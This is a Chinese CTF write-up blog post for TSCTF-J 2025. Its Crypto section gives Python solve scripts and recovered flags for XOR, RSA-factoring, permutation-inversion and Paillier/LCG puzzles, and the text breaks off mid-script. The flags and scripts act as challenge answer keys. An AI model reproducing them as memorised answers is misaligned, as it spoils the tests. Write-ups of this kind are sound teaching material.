<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>TSCTF-J 2025 wp | Matriy's blog</title><meta name="author" content="Matriy"><meta name="copyright" content="Matriy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="ffffff"><meta name="description" content="TSCTF-J 2025 wp本次TSCTF-J，共解出27道题，逆向差两道AK，主RE赛道 先做的题后补的wp，因此写的可能有点屎，wp后面会在博客更新完善[RE部分]  Cryptosign in1234KEY1 &#x3D; a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93KEY2 ^ KEY1 &#x3D; b38dc315bb7">
<meta property="og:type" content="article">
<meta property="og:title" content="TSCTF-J 2025 wp">
<meta property="og:url" content="http://matriy330.github.io/ae56c8ab/index.html">
<meta property="og:site_name" content="Matriy&#39;s blog">
<meta property="og:description" content="TSCTF-J 2025 wp本次TSCTF-J，共解出27道题，逆向差两道AK，主RE赛道 先做的题后补的wp，因此写的可能有点屎，wp后面会在博客更新完善[RE部分]  Cryptosign in1234KEY1 &#x3D; a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93KEY2 ^ KEY1 &#x3D; b38dc315bb7">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://matriy330.github.io/img/tx.jpg">
<meta property="article:published_time" content="2025-10-13T15:00:00.000Z">
<meta property="article:modified_time" content="2025-10-14T15:06:38.181Z">
<meta property="article:author" content="Matriy">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://matriy330.github.io/img/tx.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "TSCTF-J 2025 wp",
  "url": "http://matriy330.github.io/ae56c8ab/",
  "image": "http://matriy330.github.io/img/tx.jpg",
  "datePublished": "2025-10-13T15:00:00.000Z",
  "dateModified": "2025-10-14T15:06:38.181Z",
  "author": [
    {
      "@type": "Person",
      "name": "Matriy",
      "url": "http://matriy330.github.io/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/bitbug_favicon.ico"><link rel="canonical" href="http://matriy330.github.io/ae56c8ab/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="G-ShTqjjywiLkL87Rg0PaiSsDVYymWStdQUO1wrM_VY"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    post: true
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":30,"languages":{"author":"作者: Matriy","link":"链接: ","source":"来源: Matriy's blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: true,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}
</script><link rel="stylesheet" href="/css/custom.css"><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'TSCTF-J 2025 wp',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/cursor.css"><link rel="stylesheet" href="/css/custom.css"><link rel="stylesheet" href="/css/music.css"><link rel="stylesheet" href="/css/comment.css"><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Matriy's blog" type="application/atom+xml">
</head><body><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><div class="loading-img"></div><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',()=> { preloader.endLoading() })

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><script>window.paceOptions = {
  restartOnPushState: false
}

btf.addGlobalFn('pjaxSend', () => {
  Pace.restart()
}, 'pace_restart')

</script><link rel="stylesheet" href="/css/progress_bar.css"/><script src="https://cdn.jsdelivr.net/npm/pace-js/pace.min.js"></script><div id="web_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="an_music_bg" style="background-image: url(/img/bg.jpeg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">229</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">13</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Matriy's blog</span></a><a class="nav-page-title" href="/"><span class="site-name">TSCTF-J 2025 wp</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">TSCTF-J 2025 wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-10-13T15:00:00.000Z" title="发表于 2025-10-13 23:00:00">2025-10-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-10-14T15:06:38.181Z" title="更新于 2025-10-14 23:06:38">2025-10-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CTF-wp/">CTF wp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">20.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>101分钟</span></span><span class="post-meta-separator">|</span><span id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="twikoo_visitors"><i class="fa-solid fa-spinner fa-spin"></i></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/ae56c8ab/#post-comment"><span id="twikoo-count"><i class="fa-solid fa-spinner fa-spin"></i></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="TSCTF-J-2025-wp"><a href="#TSCTF-J-2025-wp" class="headerlink" title="TSCTF-J 2025 wp"></a>TSCTF-J 2025 wp</h1><p>本次TSCTF-J，共解出27道题，逆向差两道AK，主RE赛道 先做的题后补的wp，因此写的可能有点屎，wp后面会在博客更新完善[RE部分]</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013095822927.png" alt="image-20251013095822927"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="sign-in"><a href="#sign-in" class="headerlink" title="sign in"></a>sign in</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">KEY1 = a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93</span><br><span class="line">KEY2 ^ KEY1 = b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83</span><br><span class="line">KEY2 ^ KEY3 = 11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f</span><br><span class="line">FLAG ^ KEY1 ^ KEY2 ^ KEY3 = e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121</span><br></pre></td></tr></table></figure>

<p>F ^ K1 ^ K2 ^ K3 &#x3D; X</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">K1 = <span class="built_in">int</span>(<span class="string">&#x27;a6c8b6733c9b22de7bc0253266a3867df55acde8635e19c73313c1819383df93&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K1 = <span class="built_in">int</span>(<span class="string">&#x27;b38dc315bb7c75e3c9fa84f123898ff684fd36189e83c422cf0d2804c12b4c83&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">K2_xor_K3 = <span class="built_in">int</span>(<span class="string">&#x27;11abed33a76d7be822ab718422844e1d40d72a96f02a288aa3b168165922138f&#x27;</span>, <span class="number">16</span>)</span><br><span class="line">F_xor_all = <span class="built_in">int</span>(<span class="string">&#x27;e1251504cdb300420a0520fc1c15b010d4bfb118c2477b78f3eafbe1acf0f121&#x27;</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">K2 = K2_xor_K1 ^ K1</span><br><span class="line">K3 = K2 ^ K2_xor_K3</span><br><span class="line">F = F_xor_all ^ K1 ^ K2 ^ K3</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">flag_bytes = F.to_bytes((F.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag_bytes = flag_bytes.rjust(<span class="number">48</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">flag = base64.b64decode(flag_bytes)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{I_like_Crypto}</p>
<h3 id="p-q"><a href="#p-q" class="headerlink" title="p&#x3D;~q"></a>p&#x3D;~q</h3><p>可以利用 p 和 q 之间的关系来分解 n。具体来说，p 和 q 是通过将随机生成的比特串取反后生成的，因此存在数学关系。通过这种关系，我们可以将 n 表示为关于变量 C 的二次方程，并求解 C 从而得到 p 和 q</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">n = <span class="number">17051407421191257766878232954687995776275810092183184400406052880776283989210979642731778073370935322411364098277851627904479300390445258684605069414401583042318910193017463817007183769745191345053634189302047446965986220310713141272104307300803560476507359063543147558286276881771260972717080160544078251002420560031692800880310702557545555020333582797788637377901506395695115351043959528307703535156759957098992921231240480724115372547821536358993064005667175508572424424498140029596238691489470392031290179060300593482514446687661068760457021164559923920591924277937814270216802997593891640228684835585559706493543</span></span><br><span class="line">c = <span class="number">6853848340403815994585475502319517119889957571722212403728096345969080424626781659085329098693249503884838912886399198433606071464349852827030377680456139046436386063565577131001152891176064224036780277315958771309063181054101040906120879494157473100295607616604515810676954786850526056316144848921849017030095717895244910724234927693999607754055953250981051858498499963202512464388765761597435963200846457903991924487952495202449073962133164877330289865956477568456497103568127103331224273528931042804794039714404647322385366048042459109584024130199496106946124782839099804356052016687352504438568019898976023369460</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">A = <span class="number">2</span>**<span class="number">1023</span></span><br><span class="line">D = <span class="number">9</span> * A * A - <span class="number">4</span> * n</span><br><span class="line">root = math.isqrt(D)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> root * root == D:</span><br><span class="line">    C1 = (A - root) // <span class="number">2</span></span><br><span class="line">    p1 = A + C1</span><br><span class="line">    q1 = <span class="number">2</span> * A - C1</span><br><span class="line">    <span class="keyword">if</span> p1 * q1 == n:</span><br><span class="line">        p, q = p1, q1</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        C2 = (A + root) // <span class="number">2</span></span><br><span class="line">        p2 = A + C2</span><br><span class="line">        q2 = <span class="number">2</span> * A - C2</span><br><span class="line">        <span class="keyword">if</span> p2 * q2 == n:</span><br><span class="line">            p, q = p2, q2</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;无法分解 n&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;D 不是完全平方数&quot;</span>)</span><br><span class="line"></span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag.decode())</span><br></pre></td></tr></table></figure>

<p>TSCTF-J{The_easiest_RSA_key!}</p>
<h3 id="Cantor’s-gifts"><a href="#Cantor’s-gifts" class="headerlink" title="Cantor’s gifts"></a>Cantor’s gifts</h3><p> 排列编码逆运算题</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> factorial</span><br><span class="line"></span><br><span class="line">X = <span class="number">2498752981111460725490082182453813672840574</span></span><br><span class="line">now_message = <span class="string">b&#x27;5__r0tfg5f_34rtm__t_0ury0hft0t3n11c_t&#x27;</span></span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(now_message)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1) turn X into Lehmer digits</span></span><br><span class="line">a = []</span><br><span class="line">rem = X</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    f = factorial(n - i - <span class="number">1</span>)</span><br><span class="line">    a_i = rem // f</span><br><span class="line">    a.append(a_i)</span><br><span class="line">    rem = rem % f</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2) Lehmer -&gt; permutation (values 1..n)</span></span><br><span class="line">available = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">1</span>, n+<span class="number">1</span>))</span><br><span class="line">reflection = []</span><br><span class="line"><span class="keyword">for</span> a_i <span class="keyword">in</span> a:</span><br><span class="line">    reflection.append(available.pop(a_i))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3) undo permutation: now_message[k] = message[reflection[k]-1]</span></span><br><span class="line">msg = [<span class="literal">None</span>] * n</span><br><span class="line"><span class="keyword">for</span> k, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(reflection):</span><br><span class="line">    msg[r-<span class="number">1</span>] = now_message[k:k+<span class="number">1</span>]  <span class="comment"># single byte</span></span><br><span class="line">message = <span class="string">b&#x27;&#x27;</span>.join(msg)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;message =&quot;</span>, message.decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, <span class="string">b&quot;TSCTF-J&#123;&quot;</span> + message + <span class="string">b&quot;&#125;&quot;</span>.decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251013100932768.png" alt="image-20251013100932768"></p>
<h3 id="野狐禅"><a href="#野狐禅" class="headerlink" title="野狐禅"></a>野狐禅</h3><p>题目给的 Paillier 密文里写入随机数是用 LCG 生成的，而且原始 LCG 输出值也附在文件里；利用这些值，可以把 Paillier 的随机掩码去掉，直接还原出 150 个明文序列项 y。</p>
<p>y 实际上是一个线性递推序列，前 75 项就是 flag 按三进制拆分后的系数，后 75 项是用这些系数递推出来的结果。把递推方程在模一个大素数下写成线性方程组，就可以通过高斯消元解出 75 个未知系数。</p>
<p>得到的 75 个系数就是 flag 的三进制数字。把它们按照低位在前的顺序拼回去</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">MOD = <span class="number">1_000_003</span>  <span class="comment"># large prime, works for Gaussian elimination</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_gauss_mod</span>(<span class="params">mat, rhs, mod</span>):</span><br><span class="line">  n = <span class="built_in">len</span>(mat)</span><br><span class="line">  aug = [row[:] + [rhs[i] % mod] <span class="keyword">for</span> i, row <span class="keyword">in</span> <span class="built_in">enumerate</span>(mat)]</span><br><span class="line">  row = <span class="number">0</span></span><br><span class="line">  <span class="keyword">for</span> col <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      pivot = <span class="built_in">next</span>((r <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(row, n) <span class="keyword">if</span> aug[r][col] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> pivot <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">          <span class="keyword">continue</span></span><br><span class="line">      aug[row], aug[pivot] = aug[pivot], aug[row]</span><br><span class="line">      inv = <span class="built_in">pow</span>(aug[row][col], -<span class="number">1</span>, mod)</span><br><span class="line">      aug[row] = [(val * inv) % mod <span class="keyword">for</span> val <span class="keyword">in</span> aug[row]]</span><br><span class="line">      <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">          <span class="keyword">if</span> r != row <span class="keyword">and</span> aug[r][col] % mod:</span><br><span class="line">              factor = aug[r][col] % mod</span><br><span class="line">              aug[r] = [(aug[r][c] - factor * aug[row][c]) % mod <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>)]</span><br><span class="line">      row += <span class="number">1</span></span><br><span class="line">  sol = [<span class="number">0</span>] * n</span><br><span class="line">  <span class="keyword">for</span> r <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">      leading = <span class="built_in">next</span>((c <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(n) <span class="keyword">if</span> aug[r][c] % mod), <span class="literal">None</span>)</span><br><span class="line">      <span class="keyword">if</span> leading <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">          sol[leading] = aug[r][-<span class="number">1</span>] % mod</span><br><span class="line">  <span class="keyword">return</span> sol</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  lines = [line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> f <span class="keyword">if</span> line.strip()]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">int</span>(lines[<span class="number">0</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">k = <span class="built_in">int</span>(lines[<span class="number">2</span>].split(<span class="string">&quot;: &quot;</span>)[<span class="number">1</span>])</span><br><span class="line">vals = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, lines[<span class="number">4</span>:]))</span><br><span class="line"></span><br><span class="line">ciphertexts = vals[:<span class="number">2</span> * k]</span><br><span class="line">raws = vals[<span class="number">2</span> * k:]</span><br><span class="line">n2 = n * n</span><br><span class="line"></span><br><span class="line">y = []</span><br><span class="line"><span class="keyword">for</span> c, raw <span class="keyword">in</span> <span class="built_in">zip</span>(ciphertexts, raws):</span><br><span class="line">  r = raw % n</span><br><span class="line">  rn = <span class="built_in">pow</span>(r, n, n2)</span><br><span class="line">  gm = (c * <span class="built_in">pow</span>(rn, -<span class="number">1</span>, n2)) % n2</span><br><span class="line">  y.append((gm - <span class="number">1</span>) // n)</span><br><span class="line"></span><br><span class="line">mat, rhs = [], []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(k):</span><br><span class="line">  mat.append([y[i + k - <span class="number">1</span> - j] % MOD <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k)])</span><br><span class="line">  rhs.append(y[k + i] % MOD)</span><br><span class="line"></span><br><span class="line">coeffs = solve_gauss_mod(mat, rhs, MOD)</span><br><span class="line">value = <span class="built_in">sum</span>(d * <span class="built_in">pow</span>(<span class="number">3</span>, i) <span class="keyword">for</span> i, d <span class="keyword">in</span> <span class="built_in">enumerate</span>(coeffs))</span><br><span class="line">flag = 